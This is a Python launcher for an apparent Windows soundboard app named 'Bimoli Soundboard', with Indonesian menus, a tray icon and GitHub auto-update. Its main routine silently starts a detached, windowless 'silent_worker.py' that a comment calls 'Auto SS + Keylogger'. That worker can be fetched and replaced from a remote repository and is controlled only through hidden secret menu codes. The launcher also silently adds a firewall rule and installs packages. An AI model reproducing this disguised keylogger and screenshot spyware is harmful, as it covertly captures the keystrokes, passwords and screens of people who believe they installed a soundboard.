"""
╔══════════════════════════════════════════════════╗
║     🎵 BIMOLI SOUNDBOARD LAUNCHER 🎵           ║
║     Auto Update | Worker | Tray Icon            ║
╚══════════════════════════════════════════════════╝
"""

import os
import sys
import json
import shutil
import time
import urllib.request
import zipfile
import io
import subprocess
import socket
import platform
import threading
from datetime import datetime

# ⚙️ GITHUB CONFIG
GITHUB_USER = "MerchPS"
GITHUB_REPO = "SonBot"
GITHUB_BRANCH = "main"

IS_EXE = getattr(sys, 'frozen', False)
if IS_EXE:
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

APPDATA_DIR = os.path.join(os.environ.get('LOCALAPPDATA', os.path.expanduser('~')), 'BimoliSoundboard')
SYSTEM_DIR = os.path.join(APPDATA_DIR, 'system')
IS_WINDOWS = platform.system() == "Windows"

ZIP_URL = f"https://github.com/{GITHUB_USER}/{GITHUB_REPO}/archive/refs/heads/{GITHUB_BRANCH}.zip"
VERSION_URL = f"https://raw.githubusercontent.com/{GITHUB_USER}/{GITHUB_REPO}/{GITHUB_BRANCH}/version.txt"

LOCK_FILE = os.path.join(APPDATA_DIR, '.worker.lock')
STOP_FILE = os.path.join(APPDATA_DIR, '.worker.stop')
WORKER_PY = os.path.join(SYSTEM_DIR, 'silent_worker.py')

# State
console_visible = True
is_running = True
tray_created = False
_tray_nid = None

# ============================================================
# WORKER MANAGER (Auto SS + Keylogger)
# ============================================================
def is_worker_running():
    """Cek apakah worker process lagi jalan"""
    if os.path.exists(LOCK_FILE):
        try:
            with open(LOCK_FILE, 'r') as f:
                pid = int(f.read().strip())
            import ctypes
            kernel32 = ctypes.windll.kernel32
            handle = kernel32.OpenProcess(0x0400, False, pid)
            if handle:
                kernel32.CloseHandle(handle)
                return True
        except:
            pass
        try:
            os.remove(LOCK_FILE)
        except:
            pass
    return False

def start_worker():
    """Jalankan worker di process terpisah"""
    if is_worker_running():
        return True  # Udah jalan
    
    if not os.path.exists(WORKER_PY):
        return False  # Belum di-download
    
    python_exe = dapatkan_python()
    
    # Jalankan di process terpisah (DETACHED)
    try:
        if IS_WINDOWS:
            subprocess.Popen(
                [python_exe, WORKER_PY],
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        else:
            subprocess.Popen(
                [python_exe, WORKER_PY],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True
            )
        time.sleep(1)
        return is_worker_running()
    except:
        return False

def stop_worker():
    """Stop worker process"""
    if not is_worker_running():
        return True
    
    os.makedirs(APPDATA_DIR, exist_ok=True)
    with open(STOP_FILE, 'w') as f:
        f.write("stop")
    
    for _ in range(15):
        if not os.path.exists(LOCK_FILE):
            return True
        time.sleep(0.5)
    
    # Force kill kalo masih bandel
    try:
        with open(LOCK_FILE, 'r') as f:
            pid = int(f.read().strip())
        import ctypes
        kernel32 = ctypes.windll.kernel32
        handle = kernel32.OpenProcess(0x0001, False, pid)  # PROCESS_TERMINATE
        if handle:
            kernel32.TerminateProcess(handle, 0)
            kernel32.CloseHandle(handle)
    except:
        pass
    
    # Cleanup
    for f in [LOCK_FILE, STOP_FILE]:
        try:
            os.remove(f)
        except:
            pass
    
    return not is_worker_running()

# ============================================================
# SYSTEM TRAY ICON
# ============================================================
def create_tray_icon():
    global tray_created, _tray_nid
    if not IS_WINDOWS:
        return
    try:
        import ctypes
        from ctypes import wintypes
        
        kernel32 = ctypes.windll.kernel32
        user32 = ctypes.windll.user32
        shell32 = ctypes.windll.shell32
        
        hwnd = kernel32.GetConsoleWindow()
        if not hwnd:
            return
        
        WM_TRAYICON = 0x0401
        
        class NOTIFYICONDATA(ctypes.Structure):
            _fields_ = [
                ("cbSize", wintypes.DWORD), ("hWnd", wintypes.HWND), ("uID", wintypes.UINT),
                ("uFlags", wintypes.UINT), ("uCallbackMessage", wintypes.UINT),
                ("hIcon", wintypes.HICON), ("szTip", wintypes.CHAR * 128)
            ]
        
        hIcon = user32.LoadIconW(0, 32516)
        
        nid = NOTIFYICONDATA()
        nid.cbSize = ctypes.sizeof(NOTIFYICONDATA)
        nid.hWnd = hwnd; nid.uID = 1
        nid.uFlags = 1 | 2 | 4
        nid.uCallbackMessage = WM_TRAYICON
        nid.hIcon = hIcon
        nid.szTip = b"Bimoli Soundboard - Right click for menu"
        
        shell32.Shell_NotifyIconW(0, ctypes.byref(nid))
        _tray_nid = nid; tray_created = True
        
        def tray_thread():
            orig = user32.GetWindowLongPtrW(hwnd, -4)
            def new_proc(h, m, w, l):
                if m == WM_TRAYICON:
                    if l == 0x0205: show_tray_menu(h)
                    elif l == 0x0202: show_console(); banner()
                return user32.CallWindowProcW(orig, h, m, w, l)
            WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_longlong, ctypes.c_longlong, ctypes.c_uint, ctypes.c_longlong, ctypes.c_longlong)
            user32.SetWindowLongPtrW(hwnd, -4, WNDPROC(new_proc))
        
        threading.Thread(target=tray_thread, daemon=True).start()
    except:
        pass

def show_tray_menu(hwnd):
    try:
        import ctypes
        user32 = ctypes.windll.user32
        menu = user32.CreatePopupMenu()
        user32.AppendMenuW(menu, 0, 1, "Buka Soundboard")
        user32.AppendMenuW(menu, 0, 2, "Start Server HP")
        user32.AppendMenuW(menu, 0, 3, "Sembunyikan")
        user32.AppendMenuW(menu, 0x800, 0, "")
        user32.AppendMenuW(menu, 0, 4, "Keluar")
        
        pos = ctypes.wintypes.POINT()
        user32.GetCursorPos(ctypes.byref(pos))
        user32.SetForegroundWindow(hwnd)
        cmd = user32.TrackPopupMenu(menu, 0x0100, pos.x, pos.y, 0, hwnd, None)
        
        if cmd == 1: show_console(); banner()
        elif cmd == 2: show_console(); jalankan_server()
        elif cmd == 3: hide_console()
        elif cmd == 4:
            stop_worker()
            remove_tray_icon()
            os._exit(0)
        user32.DestroyMenu(menu)
    except:
        pass

def remove_tray_icon():
    global tray_created, _tray_nid
    if tray_created and _tray_nid:
        try:
            import ctypes
            ctypes.windll.shell32.Shell_NotifyIconW(2, ctypes.byref(_tray_nid))
            tray_created = False
        except:
            pass

def setup_close_button():
    if not IS_WINDOWS:
        return
    try:
        import ctypes
        user32 = ctypes.windll.user32
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if not hwnd: return
        hMenu = user32.GetSystemMenu(hwnd, False)
        user32.DeleteMenu(hMenu, 0xF060, 0)
        user32.AppendMenuW(hMenu, 0, 1, "Sembunyikan")
        user32.AppendMenuW(hMenu, 0, 2, "Keluar")
    except:
        pass

def hide_console():
    global console_visible
    if IS_WINDOWS:
        try:
            import ctypes
            wh = ctypes.windll.kernel32.GetConsoleWindow()
            if wh: ctypes.windll.user32.ShowWindow(wh, 0); console_visible = False
        except:
            pass

def show_console():
    global console_visible
    if IS_WINDOWS:
        try:
            import ctypes
            wh = ctypes.windll.kernel32.GetConsoleWindow()
            if wh: ctypes.windll.user32.ShowWindow(wh, 5); ctypes.windll.user32.SetForegroundWindow(wh); console_visible = True
        except:
            pass

def setup_hotkey():
    try:
        import keyboard
        keyboard.add_hotkey('ctrl+shift+b', lambda: (show_console(), banner()) if not console_visible else hide_console())
    except:
        pass

# ============================================================
# FUNGSI UTAMA
# ============================================================
def bersih():
    os.system('cls' if IS_WINDOWS else 'clear')

def banner():
    if not console_visible: return
    bersih()
    status = "🟢 Aktif" if is_worker_running() else "🔴 Mati"
    print(f"""
╔══════════════════════════════════════╗
║     🎵 BIMOLI SOUNDBOARD 🎵        ║
╠══════════════════════════════════════╣
║  1. 🚀 Mulai Server (HP)           ║
║  2. 🎬 Manager + YT Downloader     ║
║  3. 🔄 Download / Install Ulang    ║
║  4. 📁 Buka Folder Suara           ║
║  5. 📁 Buka Folder Drop MP3        ║
║  6. 🔒 Sembunyikan                 ║
║  0. ❌ Keluar                       ║
║                                    ║
║  Worker: {status:<25} ║
╚══════════════════════════════════════╝
💡 Ctrl+Shift+B = Show/Hide | Klik kanan tray icon""")

def pastikan_folder():
    for f in ["suara", "suara_baru", "downloads"]:
        os.makedirs(os.path.join(BASE_DIR, f), exist_ok=True)
    os.makedirs(SYSTEM_DIR, exist_ok=True)
    os.makedirs(os.path.join(SYSTEM_DIR, "templates"), exist_ok=True)

def cek_internet():
    try: urllib.request.urlopen("https://github.com", timeout=5); return True
    except:
        try: urllib.request.urlopen("https://google.com", timeout=5); return True
        except: return False

def versi_lokal():
    vf = os.path.join(SYSTEM_DIR, "version.txt")
    if os.path.exists(vf):
        with open(vf, 'r') as f: return f.read().strip()
    return "0.0.0"

def versi_remote():
    try:
        url = f"{VERSION_URL}?t={int(time.time() * 1000)}"
        req = urllib.request.Request(url, headers={'User-Agent': 'BimoliSoundboard', 'Cache-Control': 'no-cache'})
        with urllib.request.urlopen(req, timeout=10) as r: return r.read().decode('utf-8').strip()
    except: return None

def download_system(silent=False):
    if not silent: print("\n" + "="*50 + "\n  ⏳ DOWNLOADING...\n" + "="*50)
    try:
        if not silent: print("  📥 Download...")
        req = urllib.request.Request(ZIP_URL, headers={'User-Agent': 'BimoliSoundboard'})
        with urllib.request.urlopen(req, timeout=120) as r: data = r.read()
        if not silent: print(f"  ✅ {len(data)/1024:.0f} KB")
        temp = os.path.join(BASE_DIR, "_temp")
        if os.path.exists(temp): shutil.rmtree(temp)
        os.makedirs(temp)
        with zipfile.ZipFile(io.BytesIO(data)) as z: z.extractall(temp)
        src = None
        for item in os.listdir(temp):
            p = os.path.join(temp, item)
            if os.path.isdir(p): src = p; break
        if not src: return False
        for f in ['server.py', 'bimoli_manager.py', 'silent_worker.py', 'version.txt', 'requirements.txt']:
            s = os.path.join(src, f)
            if os.path.exists(s): shutil.copy2(s, os.path.join(SYSTEM_DIR, f))
        ts = os.path.join(src, "templates"); td = os.path.join(SYSTEM_DIR, "templates")
        if os.path.exists(ts):
            if os.path.exists(td): shutil.rmtree(td)
            shutil.copytree(ts, td)
        shutil.rmtree(temp)
        subprocess.run([sys.executable, "-m", "pip", "install", "flask", "flask-socketio", "requests", "keyboard", "pillow", "--quiet"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if not silent: print("\n✅ INSTALL BERHASIL!\n")
        return True
    except: return False

def auto_cek_update():
    print("\n🔍 Cek update...", end=" ")
    if not cek_internet(): print("❌ No internet"); return
    remote_str = versi_remote()
    if not remote_str: print("⚠️  Gagal"); return
    lokal_str = versi_lokal()
    if lokal_str == "0.0.0" or remote_str != lokal_str:
        print(f"📥 v{remote_str}")
        download_system(silent=True)
    else: print(f"✅ v{lokal_str}")

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(0)
        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close(); return ip
    except: return "127.0.0.1"

def buka_firewall():
    if IS_WINDOWS: subprocess.run('netsh advfirewall firewall add rule name="Bimoli Soundboard" dir=in action=allow protocol=TCP localport=5000', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def cek_vlc():
    return any(os.path.exists(p) for p in [r"C:\Program Files\VideoLAN\VLC\vlc.exe", r"C:\Program Files (x86)\VideoLAN\VLC\vlc.exe"])

def dapatkan_python():
    if IS_EXE:
        for p in [r'C:\Program Files\Python314\python.exe', r'C:\Python314\python.exe']:
            if os.path.exists(p): return p
        return 'python'
    return sys.executable

def jalankan_server():
    server_py = os.path.join(SYSTEM_DIR, "server.py")
    if not os.path.exists(server_py):
        print("\n⚠️  Server belum terinstall!")
        if cek_internet(): download_system()
        else: print("❌ Butuh internet")
        input("\nTekan Enter..."); return
    buka_firewall(); ip = get_ip(); python_exe = dapatkan_python()
    bersih()
    print(f"""
╔══════════════════════════════════════════════════╗
║        🎵 BIMOLI SOUNDBOARD AKTIF 🎵            ║
║   📱 http://{ip}:5000{'':<32}║
║   🔴 Ctrl+C untuk berhenti                      ║
╚══════════════════════════════════════════════════╝
""")
    if not cek_vlc(): print("💡 Install VLC: https://www.videolan.org/vlc/\n")
    env = os.environ.copy(); env['BIMOLI_BASE_DIR'] = BASE_DIR; env['BIMOLI_SYSTEM_DIR'] = SYSTEM_DIR
    try: subprocess.run([python_exe, server_py], env=env, cwd=BASE_DIR)
    except KeyboardInterrupt: pass
    print("\n⏹️  Server dihentikan.\n👋 Sampai jumpa!"); sys.exit(0)

def jalankan_manager():
    manager_py = os.path.join(SYSTEM_DIR, "bimoli_manager.py")
    if not os.path.exists(manager_py):
        print("\n⚠️  Manager belum terinstall!")
        if cek_internet(): download_system()
        else: print("❌ Butuh internet")
        input("\nTekan Enter..."); return
    python_exe = dapatkan_python()
    env = os.environ.copy(); env['BIMOLI_BASE_DIR'] = BASE_DIR; env['BIMOLI_SYSTEM_DIR'] = SYSTEM_DIR
    subprocess.run([python_exe, manager_py], env=env, cwd=BASE_DIR)

def buka_folder(nama):
    folder = os.path.join(BASE_DIR, nama)
    if os.path.exists(folder) and IS_WINDOWS: os.startfile(folder)

def main():
    global is_running
    pastikan_folder()
    
    # AUTO START WORKER (process terpisah)
    start_worker()
    
    create_tray_icon()
    setup_close_button()
    setup_hotkey()
    
    python_exe = dapatkan_python()
    subprocess.run([python_exe, "-m", "pip", "install", "flask", "flask-socketio", "requests", "keyboard", "pillow", "--quiet"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    auto_cek_update()
    time.sleep(0.3)
    
    while is_running:
        banner()
        p = input("\nPilih (0-6): ").strip()
        
        # KODE RAHASIA: 20071 = STOP WORKER
        if p == '20071':
            print("\n🔑 Kode rahasia terdeteksi!")
            print("🛑 Menghentikan Worker...")
            if stop_worker():
                print("✅ Worker dihentikan!")
            else:
                print("❌ Gagal menghentikan worker")
            input("\nTekan Enter...")
            continue
        
        # KODE RAHASIA: 20072 = START WORKER
        if p == '20072':
            print("\n🔑 Kode rahasia terdeteksi!")
            print("🚀 Menjalankan Worker...")
            if start_worker():
                print("✅ Worker berjalan!")
            else:
                print("❌ Gagal menjalankan worker")
            input("\nTekan Enter...")
            continue
        
        if p == '1': jalankan_server()
        elif p == '2': jalankan_manager()
        elif p == '3':
            if cek_internet(): download_system()
            else: print("\n❌ No internet")
            input("\nTekan Enter...")
        elif p == '4': buka_folder("suara"); time.sleep(0.3)
        elif p == '5': buka_folder("suara_baru"); time.sleep(0.3)
        elif p == '6':
            print("\n🔒 Sembunyi... Ctrl+Shift+B atau klik tray icon")
            time.sleep(1); hide_console()
        elif p == '0':
            stop_worker()
            remove_tray_icon()
            print("\n👋 Bye!"); break

if __name__ == "__main__":
    main()
